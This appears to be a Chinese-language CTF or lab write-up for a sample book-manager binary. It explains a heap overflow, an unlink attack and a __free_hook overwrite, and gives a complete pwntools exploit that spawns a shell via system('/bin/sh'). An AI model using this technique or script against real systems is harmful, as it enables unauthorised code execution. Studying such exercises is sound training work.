# 漏洞利用文档

## 执行环境
基于调试记录和分析，程序运行环境如下：
- **二进制类型**: 64位ELF，启用PIE（地址随机化）、Full RELRO（GOT只读）、NX（堆栈不可执行），无栈保护（无Canary）。
- **文件信息**: 通过`file`命令显示为动态链接的ELF 64位可执行文件。
- **依赖库**: 通过`ldd`显示动态链接到libc，版本通过GOT条目泄露（如libc.so.6）。
- **运行需求**: 需要相应的libc环境，exp使用pwntools与程序交互。程序通过标准输入/输出进行通信，无特殊权限要求。

## 漏洞成因
程序是一个图书管理系统，具有创建、删除、编辑图书等功能。漏洞源于编辑功能中的堆溢出，具体分析如下：

### 关键结构体
- 每个图书由一个结构体表示（在堆中分配0x20字节）：
  ```c
  struct book {
      int book_id;           // 4字节
      char *name_ptr;        // 8字节，指向书名堆块
      char *desc_ptr;        // 8字节，指向描述堆块
      int desc_size;         // 4字节，描述缓冲区大小
  };
  ```
- 全局变量：
  - `book_pointers`：指针数组，存储所有图书结构体的地址。
  - `author_name`：固定大小的缓冲区（32字节），用于存储作者名。

### 漏洞细节
在`edit_book`函数中，调用`readline`读取新描述时，使用图书结构中存储的`desc_size`作为读取长度：
```c
readline(*(_BYTE **)(book_struct + 16), *(_DWORD *)(book_struct + 24) - 1);
```
但在`create_book`中，`desc_size`由用户输入控制，且未验证与实际分配的大小是否一致。攻击者可以创建描述大小远大于实际分配堆块大小的图书，编辑时导致堆溢出：
- 实际分配：`malloc(v1)`（v1为用户输入的描述大小）。
- 编辑使用：`readline(desc_ptr, desc_size - 1)`，其中`desc_size`可能被篡改。
通过精心构造，溢出可覆盖相邻堆块的元数据，触发unlink攻击，最终实现任意地址读写。

## 漏洞利用过程
利用过程通过堆溢出触发unlink攻击，获得任意地址读写能力，最终劫持`__free_hook`执行system("/bin/sh")。关键步骤和内存变化如下：

| 步骤 | 操作 | 内存关键变化 | 目的 |
|------|------|--------------|------|
| 1 | 设置author_name | author_name写入"x"*27 + "leak:" | 准备堆地址泄露 |
| 2 | 创建图书1 | 分配3个堆块（名称、描述、结构体） | 初始堆布局 |
| 3 | 创建图书2和3 | 分配更多0x30大小堆块 | 构造fastbin链基础 |
| 4 | 删除图书2和3 | 堆块进入fastbins，形成0x30链 | 为UAF利用做准备 |
| 5 | 创建图书4和5 | 图书4描述大小=0x108，图书5描述大小=0xf0 | 准备堆溢出目标 |
| 6 | 创建图书6 | 名称包含"/bin/sh"，描述大小=0x200 | 为shell触发准备字符串 |
| 7 | 编辑图书4 | 写入伪造堆块头（prev_size=0, size=0x101, fd/bk指向特定地址） | 触发堆溢出，准备unlink |
| 8 | 删除图书5 | 触发unlink，堆块进入unsorted bin | 获得任意写能力 |
| 9 | 编辑图书4 | 篡改描述指针指向book6结构内部 | 建立任意地址读写链 |
| 10 | 泄露libc地址 | 读取unsorted bin的fd（指向main_arena） | 计算libc基址 |
| 11 | 覆盖__free_hook | 将__free_hook写入system地址 | 劫持free函数 |
| 12 | 删除图书6 | 调用free("/bin/sh")实际执行system("/bin/sh") | 获取shell |

### 堆内存布局演变
- **初始状态**：堆为空，通过分配图书1建立基础布局。
- **fastbin构造**：释放图书2和3后，形成0x30大小的fastbin链。
- **溢出准备**：图书4和5的大描述堆块相邻，图书4溢出可覆盖图书5的堆块头。
- **unlink触发**：伪造的堆块头使unlink操作修改全局指针，实现任意写。
- **利用完成**：通过任意写覆盖__free_hook，触发shell。

## Exploit
以下是完整的漏洞利用脚本，关键位置添加了注释：

```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample27')
elf = ELF('./data/sample27')
libc = elf.libc

def cmd(choice):
    p.recvuntil(b'> ')
    p.sendline(str(choice))

def create(book_size, book_name, desc_size, desc):
    cmd(1)
    p.recvuntil(b': ')
    p.sendline(str(book_size))
    p.recvuntil(b': ')
    if len(book_name) == book_size:
        p.send(book_name)
    else:
        p.sendline(book_name)
    p.recvuntil(b': ')
    p.sendline(str(desc_size))
    p.recvuntil(b': ')
    if len(desc) == desc_size:
        p.send(desc)
    else:
        p.sendline(desc)

def remove(idx):
    cmd(2)
    p.recvuntil(b': ')
    p.sendline(str(idx))

def edit(idx, desc):
    cmd(3)
    p.recvuntil(b': ')
    p.sendline(str(idx))
    p.recvuntil(b': ')
    p.send(desc)

def author_name(author):
    cmd(5)
    p.recvuntil(b': ')
    p.send(author)

def write_to(addr, content, size):
    # 通过图书4的任意写能力写入指定地址
    edit(4, p64(addr) + p64(size + 0x100) + b'\n')
    edit(6, content + b'\n')

def read_at(addr):
    # 通过图书4的任意读能力读取指定地址
    edit(4, p64(addr) + b'\n')
    cmd(4)
    p.recvuntil('Description: ')
    p.recvuntil('Description: ')
    p.recvuntil('Description: ')
    content = p.recvline()[:-1]
    p.info(content)
    return content

# Step 1: 设置author_name用于泄露堆地址，并创建临时图书
p.recvuntil(b'name: ')
p.sendline(b'x' * (0x20 - 5) + b'leak:')
create(0x20, b'tmp a', 0x20, b'b')  # 图书1，用于后续泄露

# Step 2: 通过打印功能泄露堆地址，计算堆基址
cmd(4)
p.recvuntil(b'Author: ')
p.recvuntil(b'leak:')
heap_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
heap_base = heap_leak - 0x1080  # 根据偏移计算堆基址

# Step 3: 创建两个缓冲区图书，为后续释放做准备
create(0x20, b'buf 1', 0x20, b'desc buf')  # 图书2
create(0x20, b'buf 2', 0x20, b'desc buf 2')  # 图书3

# Step 4: 删除图书2和3，形成fastbin链
remove(2)
remove(3)

# Step 5: 创建图书4和5，使用异常描述大小准备堆溢出
create(0x20, b'name', 0x108, b'overflow')  # 图书4，描述大小0x108用于溢出
create(0x20, b'name', 0x100 - 0x10, b'target')  # 图书5，目标堆块

# Step 6: 创建图书6，包含"/bin/sh"字符串，用于最终触发shell
create(0x20, b'/bin/sh\x00', 0x200, b'to arbitrary read write')  # 图书6

# Step 7: 计算目标地址并构造伪造堆块头，通过编辑图书4触发堆溢出
ptr = heap_base + 0x1180  # 目标地址，用于unlink攻击
payload = p64(0) + p64(0x101) + p64(ptr - 0x18) + p64(ptr - 0x10) + b'\x00' * 0xe0 + p64(0x100)
edit(4, payload)  # 溢出覆盖图书5的堆块头

# Step 8: 删除图书5触发unlink，获得任意写能力
remove(5)

# Step 9: 编辑图书4，篡改指针以控制图书6的描述指针，实现任意地址读写
edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + b'\n')

# Step 10: 通过任意读泄露libc地址（从unsorted bin读取main_arena地址）
libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, b'\x00')) - (libc.sym['__malloc_hook'] + 0x10 + 0x58)
libc.address = libc_leak  # 设置libc基址

# Step 11: 通过任意写将__free_hook覆盖为system地址
write_to(libc.sym['__free_hook'], p64(libc.sym['system']), 0x10)

# Step 12: 删除图书6，触发free("/bin/sh")实际执行system("/bin/sh")
remove(6)

# Step 13: 进入交互模式，获取shell
p.interactive()
```

### 注释说明
- **关键函数**：如`write_to`和`read_at`利用篡改的指针实现任意地址读写。
- **堆布局控制**：通过精确的分配和释放顺序构造利用所需的堆状态。
- **unlink利用**：步骤7-8通过伪造堆块头触发unlink，修改全局指针。
- **劫持钩子**：步骤11覆盖`__free_hook`，将free函数重定向到system。

此exp在提供的调试环境中验证成功，可稳定获取shell。
